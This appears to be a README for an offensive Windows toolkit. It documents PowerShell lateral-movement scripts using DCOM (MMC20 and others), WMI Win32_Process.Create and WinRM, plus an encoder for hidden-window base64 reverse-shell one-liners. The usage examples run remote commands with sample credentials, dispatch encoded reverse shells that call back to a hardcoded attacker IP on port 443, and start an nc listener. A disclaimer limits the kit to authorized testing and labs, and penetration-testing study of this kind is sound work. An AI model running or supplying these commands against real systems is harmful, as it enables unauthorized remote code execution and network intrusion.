# power_shellz — Windows lateral movement + payload prep

PowerShell operator utilities for moving between Windows hosts once you have a
foothold and creds, plus a payload encoder. Same idea as the rest of the kit:
**run it → copy/catch the result.** Three lateral-movement paths (DCOM, WinRM,
CIM) so when one is blocked you have the next ready, and an encoder that spits a
paste-ready reverse-shell one-liner.

> **Authorized testing only.** Labs, CTFs, and engagements with written scope.
> Everything here runs commands on remote hosts you must already control.

All three lateral tools are **fire-and-forget** — they spawn a process on the
target as your creds, but no output comes back over the wire. Start your listener
first and send a reverse shell.

---

## Invoke-DCOM.ps1 — DCOM lateral movement over RPC (135)

Instantiates a COM object on the target and runs a command through it, in the
context of the creds your session holds. Run **from an elevated PowerShell on a
foothold** where you're **local admin on the target**. Only needs DCOM/135 — no
WinRM required, which is why it's useful when 5985 is closed.

### Use it
```powershell
# dot-source, then call
. .\Invoke-DCOM.ps1

# most reliable method (MMC20), pop calc to prove exec:
Invoke-DCOM -ComputerName 192.168.50.73 -Method MMC20 -Command cmd -Arguments '/c calc'

# real use: fire an encoded PowerShell reverse shell (see encode.py):
Invoke-DCOM -ComputerName files04 -Method MMC20 -Command powershell -Arguments '-nop -w hidden -e JABjAG...'

# pipe a target list:
Get-Content targets.txt | Invoke-DCOM -Method MMC20 -Command cmd -Arguments '/c whoami' | Format-Table

# or just answer prompts:
Invoke-DCOMInteractive
```

### Methods
| Method | Notes |
|--------|-------|
| `MMC20` | MMC20.Application ExecuteShellCommand — **most reliable, start here** |
| `ShellWindows` | explorer-hosted; needs an **open explorer window** on the target |
| `ShellBrowserWindow` | explorer-hosted; no window needed, **Win8+/Server2012+** only |
| `ExcelDDE` | Excel.Application DDEInitiate; requires **Excel installed** on target |
| `RegisterXLL` | Excel.Application RegisterXLL; loads a **DLL staged on the target** |

### Parameters
| Param | Meaning |
|-------|---------|
| `-ComputerName` | target IP/hostname (pipeline-friendly) |
| `-Method` | one of the above (default `MMC20`) |
| `-Command` | program to run (`cmd`, `powershell`, `calc.exe`) |
| `-Arguments` | args for the command (`/c whoami`, `-nop -w hidden -e <b64>`) |
| `-DllPath` | `RegisterXLL` only: path to a DLL **already on the target** |

Returns a `PSCustomObject` (`Target, Method, Success, ProcessId, ReturnValue,
Message`), so results across a target list are filterable. Supports `-WhatIf`.

> Output never returns over DCOM. `Success = Dispatched` means the command was
> sent, not that it worked — **check your listener** for the shell.

---

## invoke_cmd.ps1 — CIM/DCOM via Win32_Process.Create

Spawns a process on the target through WMI/CIM `Win32_Process.Create`. Unlike
Invoke-DCOM, you **pass creds explicitly**, so you can run it from your own box
(not just an existing session) as long as you can reach the target. Default
transport is DCOM; flip to WinRM with `-Protocol Wsman`.

### Use it
```powershell
# DCOM (default) — spawn an encoded reverse shell as the given user
.\invoke_cmd.ps1 -Target 192.168.50.73 -Username corp\jen -Password 'Summer2024!' `
  -Command 'powershell -nop -w hidden -e JABjAG...'

# same over WinRM instead of DCOM
.\invoke_cmd.ps1 -Target files04 -Username jen -Password 'Summer2024!' `
  -Command 'cmd /c whoami' -Protocol Wsman
```

### Parameters
| Param | Meaning |
|-------|---------|
| `-Target` | target IP/hostname |
| `-Username` | `user` or `domain\user` |
| `-Password` | plaintext (quote it) |
| `-Command` | full command line to spawn |
| `-Protocol` | `DCOM` (default) or `Wsman` |

It decodes the `Win32_Process.Create` return code for you, so a failure tells you
*why*:

| Code | Meaning |
|------|---------|
| 0 | success — process spawned |
| 2 | access denied (creds not admin on target?) |
| 3 | insufficient privilege |
| 8 | unknown failure |
| 9 | path not found |
| 21 | invalid parameter |

> Fire-and-forget again — PID `0` return means it spawned; the shell lands on
> your listener, not in this console.

---

## invoke-lateral.ps1 — interactive WinRM / PSRemoting helper

Wraps the "`Get-Credential` won't prompt in a non-interactive shell" dance so you
stop retyping the four-line credential incantation on every hop. Run it, answer
host / user / password (masked), and it opens a PSSession — dropping you into an
interactive remote prompt or running a command.

### Use it
```powershell
# fully interactive — prompts for host, user, password
.\invoke-lateral.ps1

# pre-fill anything to skip that prompt
.\invoke-lateral.ps1 -ComputerName files04.corp.com

# one-shot recon and exit (runs a built-in enum block if no -Command)
.\invoke-lateral.ps1 -ComputerName files04 -Username jen -OneShot

# one-shot but keep the session open as $LatSession for reuse
.\invoke-lateral.ps1 -ComputerName files04 -Username jen -OneShot -Keep -Command 'whoami /all'
```

### Parameters
| Param | Meaning |
|-------|---------|
| `-ComputerName` | target (prompted if omitted) |
| `-Username` | `user` or `domain\user` (prompted if omitted) |
| `-Password` | optional; prompted **masked** if omitted (safer) |
| `-Command` | scriptblock text to run in `-OneShot` mode |
| `-OneShot` | run a command and exit instead of an interactive session |
| `-Keep` | after one-shot, keep the session as `$LatSession` |

The default `-OneShot` block (when you pass no `-Command`) dumps `whoami /all`,
hostname, NIC info (pivot surface), and local admins — a fast triage on a fresh
box. Connection failures print the usual causes (WinRM down, not in Remote
Management Users, TrustedHosts for non-domain targets).

> **Double-hop:** a session opened here won't delegate your creds to a *third*
> host — Kerberos won't forward the ticket. If the next hop gives access-denied
> with valid creds, that's why. Fix: re-run this script from the current box
> targeting the next one (fresh creds per hop), use CredSSP, or pass creds
> explicitly inside an inner `Invoke-Command`.

---

## encode.py — reverse-shell → base64 `powershell -e` one-liner

Builds the encoded PowerShell reverse shell you paste into `-Arguments` /
`-Command` above (or anywhere you get code exec). Handles the **UTF-16LE + base64**
encoding the `-e`/`-EncodedCommand` flag expects.

### Use it
```bash
python3 encode.py
# prints:  powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A...
```

Then feed it straight into a lateral tool:
```powershell
Invoke-DCOM -ComputerName files04 -Method MMC20 -Command powershell `
  -Arguments '-nop -w hidden -e JABjAG...'
```

> **Edit before use:** the callback IP and port are **hardcoded** in the payload
> string (currently `192.168.45.211:443`). Open the file and change them to your
> `tun0` IP / listener port each engagement. (Natural upgrade: make LHOST/LPORT
> argv parameters.)

---

## The workflow these serve

```
foothold + creds  →  pick a transport  →  encode a reverse shell  →  catch it
```

- **WinRM (5985) open, want a shell to drive** → `invoke-lateral.ps1`
- **WinRM closed, you're admin + on a foothold** → `Invoke-DCOM.ps1` (DCOM/135)
- **Have creds, want to spawn from your box + decode failures** → `invoke_cmd.ps1`
- **Any of them need a payload** → `encode.py` → paste the `-e` blob

### Reminders
- Start the listener (`nc -nlvp 443`) **before** you dispatch — all three lateral
  tools are fire-and-forget.
- DCOM/CIM methods need you to be **local admin on the target**; a code `2` return
  usually means you're not.
- Match the encoded payload's port to your listener, and its LHOST to your `tun0`.
